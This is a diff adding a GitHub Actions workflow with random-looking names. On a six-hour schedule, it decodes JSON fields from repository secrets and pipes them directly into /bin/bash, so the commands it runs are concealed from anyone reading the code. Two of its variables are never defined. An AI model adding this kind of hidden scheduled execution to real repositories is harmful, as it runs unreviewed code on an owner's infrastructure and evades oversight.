@@ -1,0 +1,20 @@
+name: wanglaixiahong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanglaixiahong
+        env:
+          fvmn4: ${{ secrets.fvmn4 }}
+        run: |
+          echo $fvmn4 | jq -r .w55396 | /bin/bash
+          echo $mouk2 | jq -r .yompr7 | /bin/bash
+          echo $usbkv61365 | jq -r .skv42035 | /bin/bash
+
